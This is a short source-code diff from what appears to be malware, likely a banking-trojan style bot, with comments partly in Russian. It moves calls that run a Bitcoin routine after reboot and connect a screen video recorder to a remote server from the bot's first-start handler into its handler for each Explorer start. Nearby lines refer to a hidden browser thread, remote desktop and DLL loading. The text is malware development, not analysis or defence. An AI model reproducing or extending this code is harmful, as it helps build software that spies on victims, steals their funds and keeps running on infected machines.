@@ -55,13 +55,6 @@ void ExplorerFirstStart(PEventData Data)
 	#endif
 	#endif
 
-	#ifdef BitcoinH
-		BitcoinRunAfterReboot();
-	#endif
-
-	#ifdef VideoRecorderH
-		VideoProcess::ConnectToServer( 0, true );
-	#endif
 	//ExecuteDocFind( 0, 0, 0 );
 	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 //	ExecuteRunRDP( 0, 0, 0 );
@@ -134,6 +127,14 @@ void ExplorerStart(PEventData Data)
 
 	#ifdef BOTMONITOR
     	PIPE::CreateProcessPipe((PCHAR)BotMonitor::ProcessExplorer, true);
+	#endif
+
+	#ifdef BitcoinH
+		BitcoinRunAfterReboot();
+	#endif
+
+	#ifdef VideoRecorderH
+		VideoProcess::ConnectToServer( 0, true );
 	#endif
 
 	// Запуск потока скрытого браузера.
